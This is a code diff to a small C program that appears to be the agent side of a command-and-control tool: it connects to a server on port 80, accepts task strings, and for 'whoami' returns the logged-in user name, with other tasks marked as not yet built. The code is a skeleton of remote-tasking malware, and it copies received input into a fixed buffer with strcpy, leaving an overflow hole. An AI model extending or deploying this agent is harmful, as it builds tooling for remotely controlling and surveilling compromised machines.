@@ -9,13 +9,17 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 #define IP "127.0.0.1"
-#define PORT_HTTP 8000
+#define PORT_HTTP 80
 
 //handle erros
 void error(char *message) {
     fprintf(stderr, "%s: %s\n", message, strerror(errno));
     exit(EXIT_FAILURE);
 }
+
+char *executing(char *receive);
+
+char *whoamiCommand();
 
 int main() {
     //socket http
@@ -45,11 +49,33 @@ int main() {
         printf("Receiving:\n\n%s\n\n", receive);
 
         //sending payload result
-        char response[1024] = "HELLO FROM AGENT";
+        char response[1024];
+        char command[1024];
+        char *task;
+        strcpy(command, receive);
+        task = executing(command);
+        printf("Sending: %s\n", task);
+        sprintf(response, "%s\r\n", task);
         printf("Sending: '%s' from agent...\n", response);
         if (send(inferno_socket, response, sizeof(response), 0) == -1)
             error("Error sending payload result");
         printf("Sent:\n\n'%s' from agent...\n", response);
     }
     close(inferno_socket);
+}
+
+char *executing(char *receive) {
+    char *task;
+    //execute whoami
+    if (strcmp(receive, "whoami") == 0)
+        task = whoamiCommand();
+    else
+        task = "Not yet build";
+    return task;
+}
+
+//whoami syscall
+char *whoamiCommand() {
+    char *username = getlogin();
+    return username;
 }
